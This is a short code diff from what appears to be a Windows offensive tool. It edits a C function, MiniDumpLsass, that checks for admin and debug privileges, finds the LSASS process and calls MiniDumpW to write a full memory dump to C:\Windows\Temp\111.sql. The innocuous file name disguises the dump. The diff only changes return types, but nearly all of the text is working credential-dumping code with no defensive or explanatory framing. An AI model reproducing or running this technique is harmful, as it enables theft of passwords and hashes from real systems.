@@ -73,23 +73,23 @@ BOOL CheckFileExists(PWCHAR file) {
     return TRUE;
 }
 
-int MiniDumpLsass() {
+BOOL MiniDumpLsass() {
     WCHAR commandLine[MAX_PATH];
     WCHAR DumpFile[] = L"C:\\Windows\\Temp\\111.sql";
     _MiniDumpW MiniDumpW;
     DWORD lsassPID = 0;
 
     if (!CheckPrivilege()) {
-        return -1;
+        return FALSE;
     }
 
     if (!EnableDebugPrivilege()) {
-        return -1;
+        return FALSE;
     }
 
 
     if (CheckFileExists(DumpFile)) {
-        return 0;
+        return FALSE;
     }
 
     lsassPID = GetLsassPID();
@@ -99,5 +99,5 @@ int MiniDumpLsass() {
     lstrcatW(commandLine, DumpFile);
     lstrcatW(commandLine, L" full");
     MiniDumpW(0, 0, commandLine);
-    return 0;
+    return TRUE;
 }
